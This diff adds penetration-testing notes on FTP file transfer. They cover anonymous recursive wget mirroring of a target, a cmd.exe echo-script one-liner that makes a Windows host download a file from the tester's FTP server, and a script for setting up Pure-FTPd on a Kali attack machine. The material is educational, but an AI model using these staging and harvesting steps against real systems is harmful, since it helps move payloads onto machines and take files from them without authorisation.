@@ -1,1 +1,46 @@
+ftp <RHOST>
+wget -r ftp://anonymous:anonymous@<RHOST>
 
+FTP
+ftp <ip>
+ftp>binary
+ftp>get file_name
+
+# One-liner downloader
+# in cmd.exe do not use quotes in an echo command
+echo open <ip> >> download.txt
+echo anonymous >> download.txt
+echo anon >> download.txt
+echo binary >> download.txt
+get file_name >> download.txt
+bye >> download.txt
+ftp -s:download.txt
+
+Installing Pure-FTPd
+Install Pure-FTPd server on your Kali attack machine:
+kali@kali:~$ sudo apt update && sudo apt install pure-ftpd
+
+Before any clients can connect to our FTP server, we need to create a new user for Pure-FTPd. The following Bash script will automate the user creation for us:
+
+Bash script to setup Pure-FTP on Kali
+kali@kali:~$ cat ./setup-ftp.sh
+#!/bin/bash
+
+sudo groupadd ftpgroup
+sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+sudo pure-pw useradd offsec -u ftpuser -d /ftphome
+sudo pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+sudo ln -s ../conf/PureDB 60pdb
+sudo mkdir -p /ftphome
+sudo chown -R ftpuser:ftpgroup /ftphome/
+sudo systemctl restart pure-ftpd
+
+
+Make the script executable, then run it and enter the password for the user when prompted:
+
+kali@kali:~$ chmod +x setup-ftp.sh
+kali@kali:~$ sudo ./setup-ftp.sh
+Password:
+Enter it again:
+Restarting ftp server
